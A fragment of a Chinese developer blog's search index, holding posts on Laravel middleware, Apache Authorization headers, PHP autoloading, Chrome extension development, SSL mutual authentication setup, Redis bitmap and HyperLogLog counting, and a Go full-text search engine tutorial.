is_string($middleware)) &#123; continue; &#125; list($name) = $this-&gt;parseMiddleware($middleware); $instance = $this-&gt;app-&gt;make($name); if (method_exists($instance, 'terminate')) &#123; $instance-&gt;terminate($request, $response); &#125; &#125;&#125; 此处的中间件指的是定义在 Kernel 中的 $middleware 中间件数组列表, 不包含 路由中间件. Laravel 5.1 注: 默认只有会话中间件包含 terminate() 函数 Application 服务容器的中止处理函数 123456public function terminate()&#123; foreach ($this-&gt;terminatingCallbacks as $terminating) &#123; $this-&gt;call($terminating); &#125;&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP_AUTHORIZATION]]></title>
    <url>%2Farticles%2FHTTP-AUTHORIZATION%2F</url>
    <content type="text"><![CDATA[做接口认证的时候，我们常会采用Http BearerAuth认证方式，即请求时在Header带上Authorization参数： Authorization: Bearer your_token 我们都知道php的自定义头信息都可以使用$SERVER[&#39;HTTP*&#39;]来获取, 如 “Cookie: BAIDUID=B86A8A0FF:”, 获取的时候，我们可以使用$_SERVER[&#39;HTTP_COOKIE&#39;]来获取。 但Authorization是个例外，在Apache服务器下会出现$_SERVER[&#39;HTTP_AUTHORIZATION&#39;] 获取不到值的问题. 解决方法如下: 如果已经开启rewrite_module模块，需要在httpd-vhosts.conf模块下 123456789101112131415161718&lt;VirtualHost *:80&gt; ServerName test.com DocumentRoot "/data/www/" &lt;Directory "/data/www/"&gt; # Laravel配置 Options Indexes FollowSymLinks AllowOverride All Order Deny,Allow Require all granted RewriteEngine On RewriteCond %&#123;REQUEST_FILENAME&#125; !-d RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteRule ^ index.php [L] # HTTP 基础认证需要添加下面两行 RewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$ RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;] &lt;/Directory&gt;&lt;/VirtualHost&gt; 如果没有开启rewrite_module模块，需要在入口处添加.htaccess文件，内容如下: 12345Options +FollowSymlinks -MultiviewsRewriteEngine On#Authorization HeadersRewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[记一次spl_autoload_register踩坑]]></title>
    <url>%2Farticles%2F%E8%AE%B0%E4%B8%80%E6%AC%A1spl-autoload-register%E8%B8%A9%E5%9D%91%2F</url>
    <content type="text"><![CDATA[定义： spl_autoload_register – 注册给定的函数作为 __autoload 的实现 【官方文档】 简单说就是当我们使用未引用的类时会触发这个函数执行，例如： 根据这个特性，我们可以实现自动的类加载功能，例如: 一切看起来都是如此美好，但是问题来了，在测试中我发现如下问题： 虽然成功加载了目标类，但是spl_autoload_register被触发了两次，外部实例化类的地方只有一处，显然这是不正常的（红框内的类按照处理逻辑是不应该被加载的）。 经查发现出问题的函数是 class_exists： 它的第二个参数 autoload 默认是 true, 这就导致如果指定的类 $class_name 不存在就会触发__autoload, 而spl_autoload_register是__autoload的实现,所以spl_autoload_register就被触发了。 解决方法也简单，就是在指定参数autoload为false即可： 注意此处的Demo是放在test目录下面的，和上面示例12Demo放同级目录不同 类似的常用方法还有： class_alias, trait_exists,interface_exists 等。 细心的大佬可能会发现在官方文档里面已经有人提出这个问题了： 明人不说暗话，这个坑出现在我项目 QQ空间自动导出 里，项目不大所以没有使用三方框架，自己写了一个简单的类自动加载，替代繁琐的require过程。 项目测试运行正常，但是调试的时候发现，接口调用的同时自动模型构建代码被触发执行了，原因是class_exists触发了自动加载，导致substr截取的所有字符串都当做了类来处理，结果碰巧有一个字符串就是我的自动代码构建类，这就很有意思了。 来个简单安全Case： nice~]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Chrome扩展开发]]></title>
    <url>%2Farticles%2FChrome%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[前言作者发现很多PC页面都没有做移动端转发的功能，有时候想在移动端阅读都要先在电脑上登录微信或者QQ转发到手机上面，一次两次还好，多了就觉得很不方便了，尤其是开发调试的时候。于是作者想到了开发一款浏览器插件简化一下上面的操作。 先上一下折腾出的成果 Github传送门: 正题浏览器插件是一种小型的用于定制浏览器体验的程序。通过插件，我们可以定制js爬虫、屏蔽网页广告，网页实时查词，修改http请求头，等等，能做的东西很多。只要你会HTML，JavaScript，CSS就可以动手开发浏览器插件了。 1、创建manifest.json。任何插件都必须要有这个文件，用来描述插件的元数据，插件的配置信息。 1234567891011121314151617181920212223242526272829303132333435&#123; "name":"Qrcode", "description":"Url Qrcode Extension", "version":"1.0",// 版本version在打包完插件的时候，判断插件是否需要更新 "manifest_version":2, "description":"当前页面的二维码", "browser_action":&#123;// 浏览器右上角的图标 "default_popup":"popup.html", // 弹出后运行的页面，相当于index.html "default_icon":"icon.png", "default_title":"生成页面二维码" &#125;, "icons":&#123; "16":"icon.png", "48":"icon.png", "128":"icon.png" &#125;, "commands":&#123; "_execute_browser_action":&#123; "suggested_key":&#123; // 快捷键 "default":"Ctrl+Shift+F", "mac":"MacCtrl+Shift+F" &#125;, "description":"Opens popup.html" &#125; &#125;, "permissions": [ // 授权 "background", "tabs" ], "background":&#123; // 后台运行 "script":[ "js/background.js" // 当前项目没有用到，因为不存在久驻后台的需求 ] &#125;&#125; 2、编写业务 里面内容比较简单，生成二维码和分享均用的三方插件。值得注意的是，html里面不能和js混写，这里涉及到一个权限问题。 3、运行调试 进入浏览器扩展管理 开发者模式打开，然后点击 “加载已解压的扩展程序” 将创建的插件目录导入进去，如果你只有crx文件，直接右键以压缩文件方式解压就可以看到全部代码。 成功后可以看到下面的画面 调试的跟普通网页调试差不多，右键点击弹出的扩展，点“审查元素”即可打开插件的开发工具，如图 4、打包发布 打包后会生成.crx文件，将生成的.crx项目文件直接拖入浏览器，也可以在扩展程序里面添加，Google对这个审核还是比较严格的，禁止未上架的插件拖曳使用，但是可以以开发者模式安装。 亲测360浏览器是可以直接拖曳的使用的。 总结浏览器插件开发，具有很高的实用性，值得我们去学习和了解。本文是作者记录第一次学习制作插件开发的过程，内容只是作者所用到的部分，未能面面俱到，敬请谅解。 欢迎一起讨论与留言。 参考资料 Browser Extensions 360浏览器应用开放平台 .posts-expand .post-body img{margin:0 auto; max-height:100vh;}]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SSL双向认证]]></title>
    <url>%2Farticles%2FSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[前言有朋友最近遇到客户需求：他们出于安全考虑只能是从某一台电脑才能访问应用。以下是我所想到的几种实现方案思考： IP地址。 你所用的IP都是运营商自动随机分配的，基本上都是处在变化中的，要想固定IP，你需要支付高昂的网络费用购买专网服务保证IP不发生变化，且需要保证局域网内就你使用这个对外的IP地址。 客户端软件。提供配套的客户端软件与web应用实现通信，配合MAC地址唯一性，验证客户身份。web端QQ自动登录就是这么发现你本地登录了哪些QQ的，更多可以看我这篇文章QQ如何实现跨端通信的了解原理。 SSL双向认证。生成客户证书，只让持有证书的客户访问。安装证书和安装桌面客户端是一样的考验客户的电脑操作水平。 当然，肯定还有其他更好的方案，欢迎大佬留言指点一二。 本篇文章主要是记录一下我是如何实现SSL双向认证这个方案的。ip方案没啥好说的，保证IP唯一即可。客户端软件方案我在QQ如何实现跨端通信的这篇文章有DEMO。 原理 SSL单向认证 ①客户端的浏览器向服务器传送客户端SSL协议的版本号，加密算法的种类，产生的随机数，以及其他服务器和客户端之间通讯所需要的各种信息。 ②服务器向客户端传送SSL协议的版本号，加密算法的种类，随机数以及其他相关信息，同时服务器还将向客户端传送自己的证书。 ③客户利用服务器传过来的信息验证服务器的合法性，服务器的合法性包括：证书是否过期，发行服务器证书的CA是否可靠，发行者证书的公钥能否正确解开服务器证书的”发行者的数字签名”，服务器证书上的域名是否和服务器的实际域名相匹配。如果合法性验证没有通过，通讯将断开;如果合法性验证通过，将继续进行第四步。 ④用户端随机产生一个用于后面通讯的”对称密码”，然后用服务器的公钥(服务器的公钥从步骤②中的服务器的证书中获得)对其加密，然后将加密后的”预主密码”传给服务器。 ⑤如果服务器要求客户的身份认证(在握手过程中为可选)，用户可以建立一个随机数然后对其进行数据签名，将这个含有签名的随机数和客户自己的证书以及加密过的”预主密码”一起传给服务器。 ⑥如果服务器要求客户的身份认证，服务器必须检验客户证书和签名随机数的合法性，具体的合法性验证过程包括：客户的证书使用日期是否有效，为客户提供证书的CA是否可靠，发行CA 的公钥能否正确解开客户证书的发行CA的数字签名，检查客户的证书是否在证书废止列表(CRL)中。检验如果没有通过，通讯立刻中断;如果验证通过，服务器将用自己的私钥解开加密的”预主密码 “，然后执行一系列步骤来产生主通讯密码(客户端也将通过同样的方法产生相同的主通讯密码)。 ⑦服务器和客户端用相同的主密码即”通话密码”，一个对称密钥用于SSL协议的安全数据通讯的加解密通讯。同时在SSL通讯过程中还要完成数据通讯的完整性，防止数据通讯中的任何变化。 ⑧客户端向服务器端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知服务器客户端的握手过程结束。 ⑨服务器向客户端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知客户端服务器端的握手过程结束。 ⑩-SSL的握手部分结束，SSL安全通道的数据通讯开始，客户和服务器开始使用相同的对称密钥进行数据通讯，同时进行通讯完整性的检验。 SSL双向认证 ① 浏览器发送一个连接请求给安全服务器。 ② 服务器将自己的证书，以及同证书相关的信息发送给客户浏览器。 ③ 客户浏览器检查服务器送过来的证书是否是由自己信赖的CA中心（如沃通CA）所签发的。如果是，就继续执行协议;如果不是，客户浏览器就给客户一个警告消息：警告客户这个证书不是可以信赖的，询问客户是否需要继续。 ④ 接着客户浏览器比较证书里的消息，例如域名和公钥，与服务器刚刚发送的相关消息是否一致，如果是一致的，客户浏览器认可这个服务器的合法身份。 ⑤ 服务器要求客户发送客户自己的证书。收到后，服务器验证客户的证书，如果没有通过验证，拒绝连接;如果通过验证，服务器获得用户的公钥。 ⑥ 客户浏览器告诉服务器自己所能够支持的通讯对称密码方案。 ⑦ 服务器从客户发送过来的密码方案中，选择一种加密程度最高的密码方案，用客户的公钥加过密后通知浏览器。 ⑧ 浏览器针对这个密码方案，选择一个通话密钥，接着用服务器的公钥加过密后发送给服务器。 ⑨ 服务器接收到浏览器送过来的消息，用自己的私钥解密，获得通话密钥。 ⑩ 服务器、浏览器接下来的通讯都是用对称密码方案，对称密钥是加过密的。 双向认证则是需要服务端与客户端提供身份认证，只能是服务端允许的客户能去访问，安全性相对于要高一些。 实现网上有很多实现方法，个人觉得这篇文章说的最详细：传送门 因为我域名下面申请过一个https,所以下面是我省去生成服务器端证书直接生成客户端证书的步骤： 123456789101112// 生成服务器crt, 用来验证client证书的, ca.key就是https证书那个openssl req -new -x509 -days 3650 -key ca.key -out ca.crt // 生成客户端证书openssl genrsa -des3 -out client.key 1024openssl req -new -key client.key -out client.csropenssl ca -policy policy_anything -in client.csr -cert ca.crt -keyfile ca.key -out client.crt -days 3650// 生成浏览器证书安装文件openssl pkcs12 -export -inkey client.key -in client.crt -out client.pfx 上面代码可以在linux上面执行，也可以在windows上面执行。linux不说了，windows用户主要安装了apache的可以在它bin目录下找到 openssl.exe文件。 生成好了就开始使用了 服务端 12345678910# serverlisten 443 ssl;ssl_certificate /etc/pki/ca_linvo/server/server.crt; #server公钥ssl_certificate_key /etc/pki/ca_linvo/server/server.key; #server私钥ssl_client_certificate /etc/pki/ca_linvo/root/ca.crt; # 根级证书公钥，用于验证各个二级clientssl_verify_client on; # 开启客户端ssl校验 客户端 双击 client.pfx 安装证书，安装时会提示输入生成证书时设置的密码。安装成功后，重启浏览器输入网址访问，浏览器可能会提示你选择证书，选择刚才安装的那个证书即可。 此时有些浏览器会提示用户该证书不受信任，地址不安全之类，这是因为我们的server证书是我们自己颁发的，而非真正的权威CA机构颁布，忽略它既可。当然你也可以像我一样去 x云 申请一个免费server证书用着。 测试 总结SSL单向验证过程中，客户端会验证自己访问的服务器端，服务器端对客户端不做验证。如果服务器端验证客户端，则需要开启服务器端验证，这就是双向验证。 .posts-expand .post-body img{margin:0 auto; max-height:100vh;}]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis如何存储和计算一亿用户的活跃度]]></title>
    <url>%2Farticles%2FRedis%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8%E5%92%8C%E8%AE%A1%E7%AE%97%E4%B8%80%E4%BA%BF%E7%94%A8%E6%88%B7%E7%9A%84%E6%B4%BB%E8%B7%83%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[问题如何用redis存储统计1亿用户一年内的登录情况，并快速检索任意时间窗口内的活跃用户数量？ 分析Redis 是一个内存数据库，采用单线程和事件驱动的机制来处理网络请求。实际生产的QPS和TPS单台都能达到 3~4 w，读写性能非常棒,用来存储一些对核心业务弱影响的用户状态信息还是非常不错的。 对于这个问题，有2个重要的点需要考虑： 如何选择合适的数据类型来存储 1 亿用户的数据？用普通的字符串来存储肯定不行。经查一个最简单的kv的内存占用，发现为48byte。假设每个用户每天登录需要占据1对kv的话，那一亿就是$(48*100000000)/1024/1024/1024=4.47G$，这还只是是一天的量。 如何满足搜索？redis 是一个键值对的内存结构，只能根据 key 来进行定位 value 值，无法做到像 elasticsearch 那样对文档进行倒排索引快速全文检索。 方案一：Bitmap在 redis 2.2.0 版本之后，新增了一个位图数据，它不是一种数据结构。实际上它就是一个字符串结构，只不过 value 是一个二进制数据，每一位只能是 0 或者 1 。redis 单独对 bitmap 提供了一套命令，可以对任意一位进行设置和读取。 bitmap 的核心命令： SETBIT 语法： SETBIT key offset value 例如： 123setbit abc 5 1 ----&gt; 00001setbit abc 2 1 ----&gt; 00101 GETBIT 语法：GETBIT key offset 例如： 123getbit abc 5 ----&gt; 1getbit abc 1 ----&gt; 0 bitmap 的其他命令还有 bitcount，bitcount，bitpos，bitop 等命令，都是对位的操作。 因为 bitmap 的每一位只占据 1bit 的空间 ，所以利用这个特性我们可以把每一天作为 key，value 为 1 亿用户的活跃度状态。假设一个用户一天内只要登录了一次就算活跃。活跃我们就记为 1，不活跃我们就记为 0 。把用户 Id 作为偏移量(offset)。这样我们一个 key 就可以存储 1 亿用户的活跃状态。 我们再来算下，这样一个位图结构的值对象占据多少空间。每一个位是 1bit，一亿用户就是一亿 bit 。8bit=1Byte $100000000/8/1024/1024=11.92M$ 我用测试工程往一个 key 里通过 lua 塞进了 1 亿个 bit，然后用 rdb tools 统计这个可以需要消耗 12M 的内存空间，这完全符合要求，而且 redis 可以集群部署来进行扩容存储。我们也可以用位图压缩算法对 bitmap 进行压缩存储，例如： WAH，EWAH，Roaring Bitmaps。 我们把每一天 1 亿用户的登录状态都用 bitmap 的形式存进了 redis，那要获取某一天 id 为 88000 的用户是否活跃，直接使用命令： GETBIT 2020-01-01 88000 [时间复杂度为 O(1)] 如果要统计某一天的所有的活跃用户数，使用bitcount命令，bitcount 可以统计 1 的个数，也就是活跃用户数： BITCOUNT 2020-01-01 [时间复杂度为 O(N)] 如果要统计某一段时间内的活跃用户数，需要用到 bitop 命令。这个命令提供四种位运算，AND(与)，(OR)或，XOR(亦或)，NOT(非)。我们可以对某一段时间内的所有 key 进行OR(或)操作，或操作出来的位图是 0 的就代表这段时间内一次都没有登录的用户。那只要我们求出 1 的个数就可以了。以下例子求出了 2020-01-01 到 2020-01-05 这段时间内的活跃用户数: BITCOUNT OR result 2020-01-01 2020-01-02 2020-01-03 2020-01-04 2020-01-05 [时间复杂度为 O(N)] 从时间复杂度上说，无论是统计某一天，还是统计一段时间, 在实际测试中基本上都是秒出的，符合我们的预期。 bitmap 可以很好的满足一些需要记录大量而简单信息的场景，所占空间十分小，通常来说使用场景分 2 类： 某一业务对象的横向扩展，key 为某一个业务对象的 id，比如记录某一个终端的功能开关，1 代表开，0 代表关。基本可以无限扩展，可以记录 2^32 个位信息。不过这种用法由于 key 上带有了业务对象的 id，导致了 key 的存储空间大于了 value 的存储空间，从空间使用角度上来看有一定的优化空间。 某一业务的纵向扩展，key 为某一个业务，把每一个业务对象的 id 作为偏移量记录到位上。这道面试题的例子就是用此法来进行解决。十分巧妙的利用了用户的 id 作为偏移量来找到相对应的值。当业务对象数量超过 2^32 时（约等于 42 亿），还可以分片存储。 方案二：HyperLogLogredis 从 2.8.9 之后增加了 HyperLogLog 数据结构。这个数据结构，根据 redis 的官网介绍，这是一个概率数据结构，用来估算数据的基数。能通过牺牲准确率来减少内存空间的消耗。 我们先来看看 HyperLogLog 的方法： PFADD 添加一个元素，如果重复，只算作一个 PFCOUNT 返回元素数量的近似值 PFMERGE 将多个 HyperLogLog 合并为一个 HyperLogLog 这很好理解，是不是。那我们就来看看同样是存储一亿用户的活跃度，HyperLogLog 数据结构需要多少空间。是不是比 bitmap 更加省空间呢。 我通过测试工程往 HyperLogLog 里 PFADD 了一亿个元素，通过 rdb tools 工具统计了这个 key 只需要 14392 Bytes，也就是 14KB 的空间。bitmap 存储一亿需要 12M，而 HyperLogLog 只需要 14K 的空间。这是一个很惊人的结果。接下来我又放了 1000w 数据，统计出来还是 14k 。也就是说，无论你放多少数据进去，都是 14K 。 查了文档，发现 HyperLogLog 是一种概率性数据结构，在标准误差 0.81%的前提下，能够统计 ${2}^{64}$ 个数据。所以 HyperLogLog 适合在比如统计日活月活此类的对精度要不不高的场景。 HyperLogLog 使用概率算法来统计集合的近似基数，而它算法的最本源则是伯努利过程。 伯努利过程：简单来说，伯努利过程就是一个抛硬币实验的过程。抛一枚正常硬币，落地可能是正面，也可能是反面，二者的概率都是 $\frac{1}{2}$ 。伯努利过程就是一直抛硬币，直到落地时出现正面位置，并记录下抛掷次数 k 。比如说，抛一次硬币就出现正面了，此时 k 为 1; 第一次抛硬币是反面，则继续抛，直到第三次才出现正面，此时 k 为 3 。 对于 n 次伯努利过程，我们会得到 n 个出现正面的投掷次数值 $k_1$, $k_2$ … $k_n$ , 其中这里的最大值是 $k_{max}$ 。根据一顿数学推导，我们可以得出一个结论：${2}^{k_{max}}$来作为 n 的估计值。也就是说你可以根据最大投掷次数近似的推算出进行了几次伯努利过程。 虽然 HyperLogLog 数据类型不是精确统计,只适用于对精度要求不高的场景，而且这种类型无法得出每个用户的活跃度信息。 总结对于文章开头所提到的问题，用 Bitmap 和 HyperLogLog 都可以解决。 Bitmap HyperLogLog 优点 非常均衡的特性，精准统计，可以得到每个统计对象的状态，秒出 可以统计夸张到无法想象的数量，并且占用小的夸张的内存 缺点 当你的统计对象数量十分十分巨大时，可能会占用到一点存储空间，但也可在接受范围内。也可以通过分片，或者压缩的额外手段去解决 建立在牺牲准确率的基础上，而且无法得到每个统计对象的状态]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[实现一个简单的全文检索引擎]]></title>
    <url>%2Farticles%2F%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[全文检索是人们每天都在使用的工具之一。如果你曾经在google上搜索过“golang使用情况”或试图在电子商务网站上找到“室内无线摄像头”，你都会使用某种全文检索。 全文检索（FTS）是一种在文档集合中搜索文本的技术。文档可以引用网页、报纸文章、电子邮件或其他任何结构文本。 今天我们要建造我们自己的FTS引擎。在这篇文章的最后，我们将能够在不到一毫秒的时间内搜索数百万个文档。我们将从简单的搜索查询开始，比如“给我包含单词cat的所有文档”，然后扩展引擎以支持更复杂的布尔查询。 注：最著名的FTS引擎是Lucene（以及在此基础上构建的 Elasticsearch 和 Solr ）。 为什么选择FTS在我们开始编写代码之前，您可能会问：“我们不能只使用grep，或者使用一个循环来检查每个文档是否包含我要查找的单词？” 是的，我们可以，但这并不是最好的方式。 语料库点击下载 dumps.wikimedia.org 语料。 语料的格式如下： 123&lt;title&gt;Wikipedia: Kit-Cat Klock&lt;/title&gt;&lt;url&gt;https://en.wikipedia.org/wiki/Kit-Cat_Klock&lt;/url&gt;&lt;abstract&gt;The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.&lt;/abstract&gt; 加载文档首先，我们需要加载上一步下载的文档。 123456789101112131415161718192021222324252627282930313233import ( "encoding/xml" "os")type document struct &#123; Title string `xml:"title"` URL string `xml:"url"` Text string `xml:"abstract"` ID int&#125;func loadDocuments(path string) ([]document, error) &#123; f, err := os.Open(path) if err != nil &#123; return nil, err &#125; defer f.Close() dec := xml.NewDecoder(f) dump := struct &#123; Documents []document `xml:"doc"` &#125;&#123;&#125; if err := dec.Decode(&amp;dump); err != nil &#123; return nil, err &#125; docs := dump.Documents for i := range docs &#123; docs[i].ID = i &#125; return docs, nil&#125; 每个加载的文档都会被分配一个唯一的标识符。为了简单起见，第一个加载的文档分配ID=0，第二个ID=1，依此类推。 常规搜索测试关键词搜索 现在我们已经将所有文档加载到内存中，我们可以尝试找到关于猫的文档。首先，让我们遍历所有文档并检查它们是否包含子字符串cat： 123456789func search(docs []document, term string) []document &#123; var r []document for _, doc := range docs &#123; if strings.Contains(doc.Text, term) &#123; r = append(r, doc) &#125; &#125; return r&#125; 在我的笔记本电脑上，搜索需要 103ms, 还不错。 如果您抽查了输出中的一些文档， 您可能会注意到该函数与caterpillar和category匹配，但cat与大写字母C不匹配。这不是我想要的。 在继续之前，我们需要解决两个问题： 使搜索不区分大小写（因此Cat也匹配）。 匹配单词边界而不是子字符串（因此caterpiller和communication不匹配）。 正则表达式搜索 一个快速想到并允许实现这两个需求的解决方案是正则表达式。 例如：(?i)\bcat\b (?i) 大小写不敏感 \b 匹配单词边界（一边是单词字符，另一边不是单词字符的位置） 12345678910func search(docs []document, term string) []document &#123; re := regexp.MustCompile(`(?i)\b` + term + `\b`) // Don't do this in production, it's a security risk. term needs to be sanitized. var r []document for _, doc := range docs &#123; if re.MatchString(doc.Text) &#123; r = append(r, doc) &#125; &#125; return r&#125; 呃，搜索花了2秒多。如您所见，即使有60万个文档，事情也开始变得缓慢。虽然该方法易于实现，但它的扩展性并不好。随着数据集越来越大，我们需要扫描越来越多的文档。该算法的时间复杂度是线性的, 需要扫描的文档数等于文档总数。如果我们有600万份文档，而不是60万份，搜索需要20秒。所以我们还需要优化。 反向索引为了使搜索查询更快，我们将对文本进行预处理并预先建立索引。 FTS的核心是一种称为反向索引的数据结构, 将文档中的每个单词与包含该单词的文档相关联。 例如： 12345678910111213141516171819documents = &#123; 1: "a donut on a glass plate", 2: "only the donut", 3: "listen to the drum machine",&#125;index = &#123; "a": [1], "donut": [1, 2], "on": [1], "glass": [1], "plate": [1], "only": [2], "the": [2, 3], "listen": [3], "to": [3], "drum": [3], "machine": [3],&#125; 下面是一个倒排索引的真实例子。书名索引书中一个术语引用页码的索引： 文本分析在开始构建索引之前，我们需要将原始文本分解为一个适合索引和搜索的单词（标记）列表。 文本分析器由一个分词器器和多个过滤器组成。 分词器分词器是文本分析的第一步。它的工作是将文本转换为标记列表。我们的实现在单词边界上拆分文本并删除标点符号： 123456func tokenize(text string) []string &#123; return strings.FieldsFunc(text, func(r rune) bool &#123; // Split on any character that is not a letter or a number. return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) &#125;)&#125; 123&gt; tokenize("A donut on a glass plate. Only the donuts.")["A", "donut", "on", "a", "glass", "plate", "Only", "the", "donuts"] 过滤器在大多数情况下，仅仅将文本转换为标记列表是不够的。为了使文本更易于索引和搜索，我们需要进行额外的规范化。 大小写过滤为了使搜索不区分大小写，小写过滤器将标记转换为小写。cAt、Cat和caT规范化为cat。 稍后，当我们查询索引时，我们也会降低搜索词的大小写。这将使搜索词cAt能与文本cAt匹配。 1234567func lowercaseFilter(tokens []string) []string &#123; r := make([]string, len(tokens)) for i, token := range tokens &#123; r[i] = strings.ToLower(token) &#125; return r&#125; 123&gt; lowercaseFilter([]string&#123;"A", "donut", "on", "a", "glass", "plate", "Only", "the", "donuts"&#125;)["a", "donut", "on", "a", "glass", "plate", "only", "the", "donuts"] 去除停止语几乎所有的英语文本都包含了像a，I，the或be这样的常用词。这样的话叫做停止语。我们将删除它们，因为几乎所有文档都会匹配停止字。没有“官方”的停止语列表。我们把OEC rank前10名排除在外。请根据需要添加： 1234567891011121314var stopwords = map[string]struct&#123;&#125;&#123; // I wish Go had built-in sets. "a": &#123;&#125;, "and": &#123;&#125;, "be": &#123;&#125;, "have": &#123;&#125;, "i": &#123;&#125;, "in": &#123;&#125;, "of": &#123;&#125;, "that": &#123;&#125;, "the": &#123;&#125;, "to": &#123;&#125;,&#125;func stopwordFilter(tokens []string) []string &#123; r := make([]string, 0, len(tokens)) for _, token := range tokens &#123; if _, ok := stopwords[token]; !ok &#123; r = append(r, token) &#125; &#125; return r&#125; 123&gt; stopwordFilter([]string&#123;"a", "donut", "on", "a", "glass", "plate", "only", "the", "donuts"&#125;)["donut", "on", "glass", "plate", "only", "donuts"] 去除多形词由于语法规则，文档可能包含同一单词的不同形式。词干分析将单词简化为基本形式。例如，fishing、fished和fisher 可以简化为 fish 。 实现词干分析器是一项非常重要的任务，这篇文章不讨论它。我们将使用现有的模块之一 123456789import snowballeng "github.com/kljensen/snowball/english"func stemmerFilter(tokens []string) []string &#123; r := make([]string, len(tokens)) for i, token := range tokens &#123; r[i] = snowballeng.Stem(token, false) &#125; return r&#125; 123&gt; stemmerFilter([]string&#123;"donut", "on", "glass", "plate", "only", "donuts"&#125;)["donut", "on", "glass", "plate", "only", "donut"] 注: 词干并不总是一个有效的词。例如，airline 和 airlin。 合并1234567func analyze(text string) []string &#123; tokens := tokenize(text) tokens = lowercaseFilter(tokens) tokens = stopwordFilter(tokens) tokens = stemmerFilter(tokens) return tokens&#125; 分词器和过滤器将句子转换成一个标记列表： 123&gt; analyze("A donut on a glass plate. Only the donuts.")["donut", "on", "glass", "plate", "only", "donut"] 创建索引回到反向索引, 它将文档中的每个单词映射到文档id。map是存储映射的一个很好选择。map中的键是一个令牌（字符串），值是一个文档ID列表： 1type index map[string][]int 建立索引包括分析文档并将其ID添加到映射关系中： 12345678910111213141516171819func (idx index) add(docs []document) &#123; for _, doc := range docs &#123; for _, token := range analyze(doc.Text) &#123; ids := idx[token] if ids != nil &amp;&amp; ids[len(ids)-1] == doc.ID &#123; // Don't add same ID twice. continue &#125; idx[token] = append(ids, doc.ID) &#125; &#125;&#125;func main() &#123; idx := make(index) idx.add([]document&#123;&#123;ID: 1, Text: "A donut on a glass plate. Only the donuts."&#125;&#125;) idx.add([]document&#123;&#123;ID: 2, Text: "donut is a donut"&#125;&#125;) fmt.Println(idx)&#125; 1map[donut:[1 2] glass:[1] is:[2] on:[1] only:[1] plate:[1]] 索引检索要查询索引，我们将应用用于索引的相同标记器和过滤器： 123456789func (idx index) search(text string) [][]int &#123; var r [][]int for _, token := range analyze(text) &#123; if ids, ok := idx[token]; ok &#123; r = append(r, ids) &#125; &#125; return r&#125; 123&gt; idx.search("Small wild cat")[[24, 173, 303, ...], [98, 173, 765, ...], [[24, 51, 173, ...]] 最后，我们可以找到所有提到猫的文件。搜索60万个文档所用时间不到1毫秒（18微秒）！ 使用反向索引时，搜索查询的时间复杂度与搜索词的数量成线性关系。在上面的示例查询中，除了分析输入文本外，search只需执行三次map查找。 Boolean检索上一节中的查询为每个令牌返回一个分离的文档列表。当我们在搜索框中输入small wild cat时，我们通常期望找到的是同时包含small、wild和cat的结果列表。下一步是计算列表之间的集合交集。这样我们将得到一个匹配所有令牌的文档列表。 幸运的是，反向索引中的id是按升序插入的。由于ID是排序的，所以可以在线性时间内计算两个列表之间的交集。intersection函数同时迭代两个列表，并收集两个列表中存在的ID： 1234567891011121314151617181920func intersection(a []int, b []int) []int &#123; maxLen := len(a) if len(b) &gt; maxLen &#123; maxLen = len(b) &#125; r := make([]int, 0, maxLen) var i, j int for i &lt; len(a) &amp;&amp; j &lt; len(b) &#123; if a[i] &lt; b[j] &#123; i++ &#125; else if a[i] &gt; b[j] &#123; j++ &#125; else &#123; r = append(r, a[i]) i++ j++ &#125; &#125; return r&#125; 更新的文本分析给定的查询文本、查找标记并计算ID列表之间的集合交集： 12345678910111213141516func (idx index) search(text string) []int &#123; var r []int for _, token := range analyze(text) &#123; if ids, ok := idx[token]; ok &#123; if r == nil &#123; r = ids &#125; else &#123; r = intersection(r, ids) &#125; &#125; else &#123; // Token doesn't exist. return nil &#125; &#125; return r&#125; wikipedia dump 同时包含匹配 small、wild和cat的两个文档： 1234&gt; idx.search("Small wild cat")130764 The wildcat is a species complex comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).131692 Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat. 搜索顺利完成。 总结我们刚刚建立了一个全文搜索引擎。尽管它简单，它可以为更先进的项目奠定坚实的基础。 文中没有提到很多可以显著提高性能和使搜索引擎更人性化的东西。以下是一些进一步改进的想法： 扩展布尔查询以支持 OR 和 NOT ; 在磁盘上存储索引： 每次重新启动应用程序时重建索引可能需要一段时间; 大索引可能无法放入内存; 尝试使用内存和CPU高效的数据格式来存储文档ID集; 支持索引多个文档字段; 按相关性对结果排序; 参考lets-build-a-full-text-search-engine - krylysov]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[平滑升级PHP版本]]></title>
